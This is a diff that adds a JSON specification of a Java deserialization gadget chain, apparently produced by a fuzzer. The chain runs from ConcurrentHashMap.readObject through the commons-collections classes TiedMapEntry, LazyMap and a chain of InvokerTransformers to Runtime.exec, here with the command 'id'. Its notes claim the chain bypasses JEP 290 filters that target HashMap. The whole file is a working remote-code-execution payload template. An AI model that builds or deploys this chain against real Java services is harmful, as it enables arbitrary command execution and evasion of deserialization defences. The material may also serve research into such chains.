@@ -1,0 +1,71 @@
+{
+  "chain_type": "CC6_ConcurrentHashMap — ConcurrentHashMap root trigger (fuzzer-discovered)",
+  "root_class": "java.util.concurrent.ConcurrentHashMap",
+  "root_trigger": "readObject->putVal->key.hashCode->TiedMapEntry.hashCode->LazyMap.get",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "foo"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"},
+          {"$ref": "link:6"},
+          {"$ref": "link:7"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "java.lang.Runtime"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": 1
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec",
+  "notes": "ConcurrentHashMap bypasses JEP 290 filters targeting HashMap/HashSet. Discovered by web-fuzzer 2026-03-14."
+}
